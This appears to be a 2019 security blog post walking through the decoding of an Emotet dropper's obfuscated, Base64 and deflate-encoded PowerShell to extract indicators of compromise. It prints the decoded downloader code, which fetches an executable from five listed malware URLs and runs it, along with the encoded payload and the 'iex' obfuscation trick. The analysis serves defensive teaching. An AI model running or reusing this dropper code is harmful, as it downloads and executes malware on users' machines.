---
layout: post
title:  "Deeper analysis through PowerShell decoding"
date:   2019-03-16
categories: [Analysis]
---
Often times malware analysis is considered complete when you run the badness in a sandboxed VM and gather the network IOCs observed. However, we can gain a better list of indicators by spending a little extra time on our analysis, as I hope this post will demonstrate as I walk through some simple PowerShell decoding.

# Basic Analysis

A co-worker shared an unknown [malware sample](https://app.any.run/tasks/4c15f487-9f74-4e72-9ad6-540dc32c6148) from my favorite site, Any.run, and asked if I could help him decode it and determine the malware. From the processes on Any.run we can see that a Word Document is run, followed by some PowerShell actions. We also see in the network connections PowerShell called out to 2 suspicious domains.

{: .center}
![Any.run process list](/assets/anyrun-processes.png)

{: .center}
![Any.run connections list](/assets/anyrun-connections.png)

This gives us some indicators we can run with:

* Word Doc file hash and name
* Two suspicious domains/IPs contacted over port 443

Just like if we ran this in our own malware analysis VM, this is about where many Analysts would stop. However, there is so much more to learn here, but for the purposes of this post let's focus on what PowerShell is doing. 

# Base64 Decoding

Within Any.run clicking on PowerShell under Processes, then More Info below will show the commands being run. In this case, it's a Base64 encoded PowerShell command.

{: .center}
![Any.run more info](/assets/anyrun-commandline.png)

This is simple enough to decode using `echo <baseb4> | base64 -d` in Linux, or [CyberChef][cyberchef] (another favorite tool) as seen below, but first remove the `powershell -e` command to work with the raw base64. Once decoded we see that there is a period preceding the rest of the code, which is a Call Operator. This essentially runs code from another script or function. 

{: .center}
![CyberChef base64](/assets/cyberchef-base64.png)

What this Call Operator runs is an obfuscation trick to hide the command "iex", which is an alias for Invoke-Expression. 

{% highlight powershell %}
($PsHoMe[4]+$PshOmE[30]+'X')
{% endhighlight %}

The trick is they sliced letters from the output of the $pshome variable, which normally outputs the full path to PowerShell, and appended an X forming the word `ieX` when it's concatenated.

# Deflate Memory Stream

The expression to be executed which follows contains statements about deflating a memory stream, which means the best way to handle this is to let PowerShell do the work for us. We just have to de-fang the code so it won't actually run and infect us. *You are using a lab VM with the network disabled and a snapshot already completed, aren't you?*

First, remove the period at the beginning and the ($PsHoMe[4]+$PshOmE[30]+'X'). You should be left with the following:

{% highlight powershell %}
(nEW-obJecT Io.COmpRESSIOn.DefLAtEsTrEAm([io.MEmORYStrEam][sYSTEM.conVeRt]::FroMbAse64StrinG(('VZBda9swFIb/ii4MSshsz6thpcbQI4uGQNkwITQNg2ArJ5FiWzKOEqeE/PfJW9puuhTPeb+8HNgiA8hS+hOmHGKaeArWzPBUY++bco/Ckh9ogxcss1qhtgPgTngEKZXWtoeHMLSy0LKVxnbKyqMIhGnCvvWLTaN0eFc+h4/vZN/3wU700pgW8Q8ndsovHWa/3X9iVipdaVUFohiElBb1cYOH8On1jv1DKf22Mb2uTbEJNNpPz6iLo7/cgHVOpsXu4PzC8940xf0p3JchDeZtreyIPtJx4jUwhVUfLVNacDgDuCVyqGABJCU0+j4sA5wDZ8whz+dVlC8i9zdnAPkq9VCfHo4H7NrObFWNE/qLTm4CExrgGWmyNR0WQo685TJfGUaUJh9bji+2e7vctg/4rdSTU3rHv5Cbl8t6cqo9QJzSLMucCU1mWzIaTdH6M4vNBxnUqHdWEn+HJP7q3phcZvpkKvyPc+UZGzqnlLkwa0aT0kWtkutVFFbIy/XqzWNuYCpS2q6j3l1xmvwG')) , [iO.cOMPrESsiOn.COmpressionMoDe]::DecOMpREsS)|forEaCH{ nEW-obJecT iO.stReAMREadER( $_ , [sySteM.TexT.EncOdiNg]::ASCII) } | ForeACH{ $_.ReaDToeNd()})
{% endhighlight %}

If you copy the command above string and paste it into a PowerShell prompt, the deflate memory strem functions will run and you get this output (output highlighted):

{: .center}
![PowerShell code run](/assets/ps-code-run.png)

# Clean Up/Format Code

Again, we could stop here and pull out the clear-text URLs which can be blocked and/or hunted for in your network. However, there is still more we can pull from this code. You may already see it if you have a sharp eye, but to make the code more readable let's replace all the semicolons with carriage return characters (\r\n). You can do this with a using regex find/replace functions found in more advanced text editors like Notepad++ or just use CyberChef. Now the code should look like this:

{% highlight powershell %}
$QABUCAAC='OAGDA4'
$iA_BoD=new-object Net.WebClient
$iAUCAD1A='https://thanhphotrithuc.com/wp-admin/3bL/@https://www.gcwhoopee.com/cgi-bin/t28/@https://thinknik.ca/wp-includes/FY3B/@https://tinydownload.net/wp-admin/1r41/@http://tr.capers.co/xjoma8v/jb/'.Split('@')
$mAGAZw1X='aDAxAA'
$QAkAUA = '174'
$ADDADBBX='LxZ1QU1'
$SBAAQZ=$env:userprofile+'\'+$QAkAUA+'.exe'
foreach($XXQZoB in $iAUCAD1A){try{$iA_BoD.DownloadFile($XXQZoB, $SBAAQZ)
$vAUAwAA4='CCCQAk'
If ((Get-Item $SBAAQZ).length -ge 40000) {Invoke-Item $SBAAQZ
$mBBAxAA='BAD1_B'
break
}}catch{}}$S4DoAGc='p_1wBAAD'
{% endhighlight %}

A quick review of the code will show there are some variables set that are garbage, never used elsewhere. With Notepad++ I found if I double-click to highlight each of the variables, it will also highlight other places it is called. So any variable name that isn't called is useless and can be removed. But you can also manually review the code and remove any variables that are junk. So let's remove those and get to this point:

{% highlight powershell %}
$iA_BoD=new-object Net.WebClient
$iAUCAD1A='https://thanhphotrithuc.com/wp-admin/3bL/@https://www.gcwhoopee.com/cgi-bin/t28/@https://thinknik.ca/wp-includes/FY3B/@https://tinydownload.net/wp-admin/1r41/@http://tr.capers.co/xjoma8v/jb/'.Split('@')
$QAkAUA = '174'
$SBAAQZ=$env:userprofile+'\'+$QAkAUA+'.exe'
foreach($XXQZoB in $iAUCAD1A){try{$iA_BoD.DownloadFile($XXQZoB, $SBAAQZ)
If ((Get-Item $SBAAQZ).length -ge 40000) {Invoke-Item $SBAAQZ
break
}}catch{}}
{% endhighlight %}

You may be able to read the code just fine from this point, however here's a beautified version with indents to properly nest operations:

{% highlight powershell %}
$iA_BoD=new-object Net.WebClient
$iAUCAD1A='https://thanhphotrithuc.com/wp-admin/3bL/@https://www.gcwhoopee.com/cgi-bin/t28/@https://thinknik.ca/wp-includes/FY3B/@https://tinydownload.net/wp-admin/1r41/@http://tr.capers.co/xjoma8v/jb/'.Split('@')
$QAkAUA = '174'
$SBAAQZ=$env:userprofile+'\'+$QAkAUA+'.exe'
foreach($XXQZoB in $iAUCAD1A){
    try{
        $iA_BoD.DownloadFile($XXQZoB, $SBAAQZ)
        If ((Get-Item $SBAAQZ).length -ge 40000) {
            Invoke-Item $SBAAQZ
            break
        }
    }
    catch{}
}
{% endhighlight %}

Now we can see a couple more things. First, the download is saved as 174.exe in the root of the user's profile. Second, the URLs are tried one at a time until the download file size is greater than 40KB, and if not it moves to the next URL in the list.

# Conclusion

So with a little bit of extra work, we've come up with several more IOCs that we would have otherwise missed. And in case you were wondering, this malware sample turned out to be Emotet after doing some OSINT searches for the URLs discovered.

* C:\Users\<userprofile>\174.exe
* https://thanhphotrithuc.com/wp-admin/3bL/
* https://www.gcwhoopee.com/cgi-bin/t28/
* https://thinknik.ca/wp-includes/FY3B/
* https://tinydownload.net/wp-admin/1r41/
* http://tr.capers.co/xjoma8v/jb/

[cyberchef]: https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true)Remove_null_bytes()&input=TGdBZ0FDZ0FJQUFrQUZBQWN3QklBRzhBVFFCbEFGc0FOQUJkQUNzQUpBQlFBSE1BYUFCUEFHMEFSUUJiQURNQU1BQmRBQ3NBSndCWUFDY0FLUUFvQUc0QVJRQlhBQzBBYndCaUFFb0FaUUJqQUZRQUlBQkpBRzhBTGdCREFFOEFiUUJ3QUZJQVJRQlRBRk1BU1FCUEFHNEFMZ0JFQUdVQVpnQk1BRUVBZEFCRkFITUFWQUJ5QUVVQVFRQnRBQ2dBV3dCcEFHOEFMZ0JOQUVVQWJRQlBBRklBV1FCVEFIUUFjZ0JGQUdFQWJRQmRBRnNBY3dCWkFGTUFWQUJGQUUwQUxnQmpBRzhBYmdCV0FHVUFVZ0IwQUYwQU9nQTZBRVlBY2dCdkFFMEFZZ0JCQUhNQVpRQTJBRFFBVXdCMEFISUFhUUJ1QUVjQUtBQW9BQ2NBVmdCYUFDY0FLd0FuQUVJQVpBQmhBRGtBY3dCM0FFWUFKd0FyQUNjQVNRQmlBQzhBYVFCcEFEUUFUUUJUQUhNQWFBQnpBSG9BSndBckFDY0FOZ0IwQUdnQWNBQW5BQ3NBSndCakFHSUFVUUJKQUNjQUt3QW5BRFFBZFFCSEFGRUFUZ0JyQUhjQVNRQlVBRkVBSndBckFDY0FUZ0FuQUNzQUp3Qm5BRElBUVFBbkFDc0FKd0J5QUVvQU5RQkdBR2tBVndCNkFFc0FUd0JGQUhFQVpRQkZBQ2NBS3dBbkFDOEFVQUFuQUNzQUp3Qm1BQ2NBS3dBbkFFb0FKd0FyQUNjQVZ3QTVBSEFBZFFCMUFHZ0FWQUJRQUdVQVlnQXJBQ2NBS3dBbkFEZ0FKd0FyQUNjQVNBQk9BQ2NBS3dBbkFHY0FhUUJCQURnQWFBQlRBQ3NBYUFCUEFHMEFTQUJIQUVzQVlRQmxBQ2NBS3dBbkFFRUFjZ0JYQUhvQVVBQW5BQ3NBSndCQ0FGVUFXUUFyQUNzQVlnQW5BQ3NBSndCakFHOEFMd0JEQUdzQWFBQTVBRzhBWndCNEFHTUFjd0FuQUNzQUp3QnpBQ2NBS3dBbkFERUFjUUJvQUhRQUp3QXJBQ2NBWndCUUFHY0FWQUJ1QUdjQUp3QXJBQ2NBUlFBbkFDc0FKd0JMQUZvQUp3QXJBQ2NBV0FCWEFDY0FLd0FuQUhRQWJ3QmxBQ2NBS3dBbkFFZ0FUUUFuQUNzQUp3Qk1BRk1BZVFBd0FFd0FTd0JXQUNjQUt3QW5BSGdBYmdCaUFFc0FlUUJ4QUUwQVNRQm9BQ2NBS3dBbkFFY0FKd0FyQUNjQWJnQkRBQ2NBS3dBbkFIWUFkZ0JYQUV3QVZBQmhBQ2NBS3dBbkFFNEFNQUJsQUVZQVl3QXJBR2dBSndBckFDY0FOQUF2QUhZQVdnQk9BQzhBTXdCM0FGVUFKd0FyQUNjQU53QXdBREFBY0FCbkFDY0FLd0FuQUZjQUp3QXJBQ2NBT0FCUkFEZ0FKd0FyQUNjQWJnQmtBSE1BYndCMkFFZ0FWd0JoQUNjQUt3QW5BQzhBTXdCWUFEa0FKd0FyQUNjQWFRQldBR2tBY0FCa0FHRUFWZ0FuQUNzQUp3QlZBRVlBSndBckFDY0Fid0JvQUdrQUp3QXJBQ2NBUlFCc0FFSUFZZ0F4QUdNQVdRQlBBRWdBT0FCUEFHNEFNUUFuQUNzQUp3QnFBSFlBTVFCRUFFc0FKd0FyQUNjQVpnQXlBRElBSndBckFDY0FUUUJpQURJQWRRQW5BQ3NBSndCVUFHSUFSUUJLQUU0QVRnQndBQ2NBS3dBbkFGQUFKd0FyQUNjQWVnQTJBR2tBVEFCdkFEY0FMd0JqQUNjQUt3QW5BR2NBU0FCV0FFOEFjQUJ6QUZnQWRRQTBBRkFBZWdBbkFDc0FKd0JEQUNjQUt3QW5BRGdBT1FBMEFEQUFlQUFuQUNzQUp3Qm1BREFBY0FBekFFb0FZd0JvQUVRQVpRQmFBSFFBY2dCbEFIa0FTUUJRQUhRQVNnQjRBRFFBYWdBbkFDc0FKd0JWQUhjQUp3QXJBQ2NBYUFCV0FGVUFaZ0JNQUZZQVRnQmhBR01BUkFCbkFDY0FLd0FuQUVRQWRRQkRBRllBZVFCeEFFY0FRUUJDQUVvQUp3QXJBQ2NBUXdCVkFEQUFLd0JxQUNjQUt3QW5BRFFBY3dCQkFEVUFKd0FyQUNjQWR3QkVBRm9BSndBckFDY0FPQUFuQUNzQUp3QjNBR2dBZWdBckFHUUFKd0FyQUNjQVZnQnNBRU1BT0FCcEFEa0FlZ0JrQUNjQUt3QW5BRzRBUVFBbkFDc0FKd0JRQUdzQWNRQTVBRllBUXdCbUFDY0FLd0FuQUVnQWJ3QTBBRWdBTndCT0FISUFUd0JpQUNjQUt3QW5BRVlBVndCT0FFVUFKd0FyQUNjQUx3QnhBRXdBSndBckFDY0FWQUFuQUNzQUp3QnRBRFFBUXdCRkFIZ0FjZ0JuQUVjQVZ3QW5BQ3NBSndCdEFIa0FUZ0JTQUNjQUt3QW5BREFBVndCUkFHOEFOZ0E0QURVQVZBQktBR1lBUndBbkFDc0FKd0JWQUdFQVZRQktBR2dBT1FCaUFHb0FKd0FyQUNjQWFRQXJBRElBWlFBbkFDc0FKd0EzQUNjQUt3QW5BSFlBWXdCMEFHY0FMd0FuQUNzQUp3QTBBQ2NBS3dBbkFISUFKd0FyQUNjQVpBQlRBRlFBVlFBekFISUFTQUFuQUNzQUp3QjJBRFVBUXdCaUFHd0FPQUIwQUNjQUt3QW5BRFlBWXdBbkFDc0FKd0J4QUNjQUt3QW5BRzhBT1FCUkFFb0FlZ0JUQUV3QVRRQW5BQ3NBSndCMUFHTUFRd0JWQURFQWJRQlhBQ2NBS3dBbkFIb0FKd0FyQUNjQVNRQmhBQ2NBS3dBbkFGUUFaQUJJQUNjQUt3QW5BRFlBSndBckFDY0FUUUEwQUhZQVRnQkNBQ2NBS3dBbkFIZ0FKd0FyQUNjQWJnQlZBSEVBSndBckFDY0FTQUJrQUZjQVJRQnVBQ3NBU0FCS0FDY0FLd0FuQUZBQU53QnhBRE1BY0FCb0FDY0FLd0FuQUdNQUp3QXJBQ2NBV2dBbkFDc0FKd0IyQUhBQUp3QXJBQ2NBYXdBbkFDc0FKd0JMQUhZQWVRQW5BQ3NBSndCUUFDY0FLd0FuQUdNQUt3QlZBRm9BUndCNkFIRUFiZ0JzQUNjQUt3QW5BRXdBYXdCM0FDY0FLd0FuQUdFQU1BQmhBQ2NBS3dBbkFGUUFKd0FyQUNjQU1BQnJBQ2NBS3dBbkFGY0FkQUFuQUNzQUp3QnJBSFVBZEFBbkFDc0FKd0JXQUVZQVJnQmlBRWtBSndBckFDY0FlUUFuQUNzQUp3QXZBRmdBY1FCNkFGY0FUZ0FuQUNzQUp3QjFBRmtBUXdCd0FGTUFNZ0FuQUNzQUp3QnhBRFlBYWdBekFHd0FNUUI0QUcwQUp3QXJBQ2NBZGdCM0FDY0FLd0FuQUVjQUp3QXBBQ2tBSUFBc0FDQUFXd0JwQUU4QUxnQmpBRThBVFFCUUFISUFSUUJUQUhNQWFRQlBBRzRBTGdCREFFOEFiUUJ3QUhJQVpRQnpBSE1BYVFCdkFHNEFUUUJ2QUVRQVpRQmRBRG9BT2dCRUFHVUFZd0JQQUUwQWNBQlNBRVVBY3dCVEFDa0FmQUJtQUc4QWNnQkZBR0VBUXdCSUFIc0FJQUJ1QUVVQVZ3QXRBRzhBWWdCS0FHVUFZd0JVQUNBQUlBQnBBRThBTGdCekFIUUFVZ0JsQUVFQVRRQlNBRVVBWVFCa0FFVUFVZ0FvQUNBQUpBQmZBQ0FBTEFBZ0FGc0Fjd0I1QUZNQWRBQmxBRTBBTGdCVUFHVUFlQUJVQUM0QVJRQnVBR01BVHdCa0FHa0FUZ0JuQUYwQU9nQTZBRUVBVXdCREFFa0FTUUFwQUNBQWZRQWdBSHdBSUFCR0FHOEFjZ0JsQUVFQVF3QklBSHNBSUFBa0FGOEFMZ0JTQUdVQVlRQkVBRlFBYndCbEFFNEFaQUFvQUNrQWZRQXBBQT09

